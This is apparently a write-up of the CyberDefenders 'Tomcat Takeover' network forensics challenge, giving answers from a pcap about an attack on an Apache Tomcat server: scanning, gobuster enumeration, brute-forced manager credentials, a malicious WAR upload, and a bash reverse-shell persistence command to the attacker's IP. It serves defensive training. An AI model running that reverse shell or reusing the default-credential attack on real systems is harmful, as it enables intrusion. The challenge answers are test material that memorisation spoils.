![image](https://github.com/user-attachments/assets/6bf87666-b18a-428a-937f-fa07f75417d8)# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/">Tomcat Takeover</a>

**Platform:** CyberDefenders

**Scenario:** As a cybersecurity analyst on SecureTech's Incident Response Team, you're tackling an urgent case involving a high-profile corporation that suspects a sophisticated cyber attack on its network. The corporation, which manages critical data across various industries, has experienced a ransomware attack, leading to the encryption of files and an immediate need for expert assistance to mitigate the damages and investigate the breach.

Your role in the team is to conduct a detailed analysis of the evidence to determine the extent and nature of the attack. Your objective is to identify the tactics, techniques, and procedures (TTPs) used by the threat actor to help your client contain the threat and restore the integrity of their network.

**Category:** Network Forensics

**Difficulty:** Easy

**Files:** ``

**Tools:** `Wireshark`

**Note:** In this walkthrough, we will use the FlareVM to analyze the provided file. If you have not set it up yet, I highly recommend following this [malware analysis lab](https://github.com/mmhgwyjs/malware-analysis-lab/blob/main/README.md) guide for assistance with your installation.

## **Preparations**

![image](https://github.com/user-attachments/assets/f7a3311d-b478-4375-a88a-a95dc12ee8ec)

![image](https://github.com/user-attachments/assets/c34a8f7b-f81d-4430-8386-f8a0bd1662f2)

## **Questions and Answers**

Got it! Here’s the response following your specified format without removing any details:

***1. Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?***  
**Answer: 14.0.0.120

![image](https://github.com/user-attachments/assets/3708496e-111b-4fe3-98d5-c8dad0e85b9f)

![image](https://github.com/user-attachments/assets/9f58165f-1f05-4007-82cb-7b7e3db1f71f)

![image](https://github.com/user-attachments/assets/95b0ef9e-70cf-46a2-a850-afa25942b569)

***2. Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?***  
**Answer: GUANGZHOU

![image](https://github.com/user-attachments/assets/013c7c77-ded5-4e6b-a7a5-a75c7356aba5)

***3. From the pcap analysis, multiple open ports were detected as a result of the attacker's activity scan. Which of these ports provides access to the web server admin panel?***  
**Answer: 8080

![image](https://github.com/user-attachments/assets/fa861a8b-f95e-4486-8390-3665a9a82f1f)

http.response.code==200

***4. Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?***  
**Answer: gobuster

![image](https://github.com/user-attachments/assets/8e0a406c-4102-4fe1-beb2-32bcbdb7dc19)

network miner

![image](https://github.com/user-attachments/assets/b73a9929-24f2-42b3-8e11-c4e20b2b467e)


***5. Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?***  
**Answer: /manager
http.user_agent matches "gobuster"

![image](https://github.com/user-attachments/assets/6389fa8f-b1dc-4362-bef4-31a24239c53d)

![image](https://github.com/user-attachments/assets/4cd555b9-85d5-4e91-9b2e-d11ee37c5fe5)

***6. Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?***  
**Answer: admin:tomcat

http.request.method == POST

![image](https://github.com/user-attachments/assets/7a51fe0c-85f2-47ac-b342-a11e531020fb)

![image](https://github.com/user-attachments/assets/95542c18-aa0d-49ac-9f05-ae9f441e294b)

YWRtaW46dG9tY2F0

![image](https://github.com/user-attachments/assets/a6764aa9-6f8b-4476-9766-847c57b102c6)


***7. Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?***  
**Answer: JXQOZY.war

![image](https://github.com/user-attachments/assets/498e4a65-59d1-4247-ac20-e0dfa3180bcd)

***8. Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?***  
**Answer: /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

![image](https://github.com/user-attachments/assets/b32c189f-dc47-4416-9334-43326f11a273)

